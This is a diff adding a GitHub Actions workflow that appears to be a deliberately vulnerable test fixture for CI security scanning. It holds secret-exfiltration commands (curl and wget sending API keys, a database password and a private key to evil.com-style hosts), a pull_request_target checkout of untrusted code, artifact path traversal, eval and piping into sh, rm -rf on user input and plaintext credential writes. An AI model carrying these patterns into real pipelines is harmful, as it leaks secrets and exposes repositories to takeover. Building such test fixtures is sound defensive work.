@@ -1,0 +1,84 @@
+name: Vulnerable Workflow Test
+on:
+  pull_request_target:
+    types: [opened, synchronize]
+  pull_request:
+  push:
+
+jobs:
+  dangerous-pr-target:
+    name: Dangerous PR Target Job
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+      packages: write
+    steps:
+      - name: Checkout with PR target
+        uses: actions/checkout@v3
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      
+      - name: Dangerous write operation
+        run: |
+          echo "secret_value=${{ secrets.API_KEY }}" >> $GITHUB_OUTPUT
+          echo "GITHUB_TOKEN=${{ secrets.GITHUB_TOKEN }}" >> $GITHUB_ENV
+      
+      - name: Local action usage
+        uses: ./local-action
+        with:
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+  credential-exfiltration:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Exfiltrate secrets
+        run: |
+          curl -X POST "https://evil.com/collect" -d "token=${{ secrets.API_KEY }}"
+          wget -O- "https://attacker.site/steal?secret=${{ secrets.DATABASE_PASSWORD }}"
+          echo "${{ secrets.PRIVATE_KEY }}" | base64 | curl -X POST -d @- https://malicious.example.com
+
+  artifact-poisoning:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Upload suspicious artifact
+        uses: actions/upload-artifact@v3
+        with:
+          name: ${{ github.event.issue.title }}
+          path: /tmp/../../../etc/passwd
+      
+      - name: Download without validation
+        uses: actions/download-artifact@v3
+        with:
+          name: user-controlled-name
+          path: /
+
+  matrix-injection:
+    runs-on: ubuntu-latest
+    strategy:
+      matrix:
+        version: ["3.8", "3.9", "3.10"]
+        platform: ["ubuntu", "windows"]
+    steps:
+      - name: Dangerous matrix usage
+        run: |
+          eval "python${{ matrix.version }} --version"
+          echo ${{ matrix.platform }} | sh
+          curl -O https://releases.python.org/python-${{ matrix.version }}.tar.gz
+
+  unsecure-commands:
+    runs-on: ubuntu-latest
+    env:
+      ACTIONS_ALLOW_UNSECURE_COMMANDS: true
+    steps:
+      - name: Using deprecated commands
+        run: echo "This enables unsecure commands"
+
+  shell-script-issues:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Shell script problems
+        run: |
+          rm -rf $user_input/*
+          eval $UNTRUSTED_VAR
+          sudo chmod 777 /tmp
+          echo $PASSWORD > /tmp/creds.txt
